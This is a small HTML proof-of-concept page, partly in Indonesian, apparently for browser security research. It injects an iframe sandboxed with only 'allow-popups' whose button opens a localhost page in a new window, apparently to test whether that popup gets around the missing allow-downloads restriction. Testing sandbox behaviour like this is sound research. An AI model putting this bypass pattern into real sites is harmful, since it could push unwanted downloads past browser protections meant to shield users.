<!DOCTYPE html>

<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>PoC Allow-Downloads Bypass Test</title>
</head>

<body>
    <h2>Sandbox allow-popups test (button trigger)</h2>

<button onclick="runExploit()">Klik untuk trigger</button>

<script>
    function runExploit() {
        let f = document.createElement('iframe');
        f.sandbox = 'allow-popups';
        
        f.srcdoc = `
            <button onclick="go()">Click me</button>
            <script>
                function go(){
                    window.open("http://localhost:8000", "_blank");
                }
            <\/script>
        `;

        document.body.appendChild(f);

        console.log("Iframe injected");
    }
</script>
</body>
